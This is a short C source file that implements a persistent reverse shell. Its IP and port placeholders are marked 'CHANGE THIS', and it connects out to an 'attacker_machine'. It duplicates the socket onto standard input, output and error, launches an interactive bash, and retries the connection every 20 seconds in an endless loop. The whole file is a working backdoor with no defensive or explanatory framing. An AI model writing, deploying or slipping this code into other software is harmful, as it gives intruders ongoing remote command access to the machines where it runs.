#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define IP "0.0.0.0" //CHANGE THIS
#define PORT 4545    //CHANGE THIS

struct sockaddr_in attacker_machine;

void exec_shell(int sock) {
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    setenv("PS1", "\\w$ ", 1);

    execl("/bin/bash", "bash", "-i", NULL);
}

void make_connection(){
    int sock;
    sock =  socket(AF_INET, SOCK_STREAM, 0);

    if(sock < 0){
        return;
    }
    
    attacker_machine.sin_family = AF_INET;
    attacker_machine.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &attacker_machine.sin_addr);

    int conn_result = connect(sock, (struct sockaddr *) &attacker_machine,sizeof(attacker_machine));
    if(conn_result < 0){ 
        close(sock);
        return;
    }

    exec_shell(sock);
    close(sock);
}


int main(){
    while(true){
        make_connection();
        sleep(20);
    }
    return 0;
}
